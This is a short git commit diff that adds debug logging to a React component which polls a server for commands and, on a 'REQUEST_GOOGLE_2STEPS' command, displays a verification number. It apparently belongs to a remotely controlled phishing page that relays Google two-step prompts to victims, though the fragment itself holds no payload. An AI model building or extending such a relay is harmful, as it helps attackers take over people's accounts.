15809d6ca5704410e4686226efa4129d496703df
Peter Ekwere <105059347+PeterEkwere@users.noreply.github.com>
2025-03-04 10:00:40 +0000

    added some debug functionalities

--- src/components/CommanderPoller.jsx
+++ src/components/CommanderPoller.jsx
@@ -12,11 +12,14 @@ export default function CommandPoller() {
       const data = await checkForCommands();
       console.log("Command received:", data?.command);  // Debug log
       if (data?.command) {
+        console.log("number received before command:", data?.number);
         setCommand(data.command);
+        console.log("number received after command:", data?.number);
 
 
         if (data.command === "REQUEST_GOOGLE_2STEPS" && data.number) {
           const number = parseInt(data.number, 10); // Parse the number
+          console.log("number received before condition:", data?.number);
           if (!isNaN(number)) {
             console.log("number received:", data?.number);
             setVerificationNumber(number); // Set the verification number
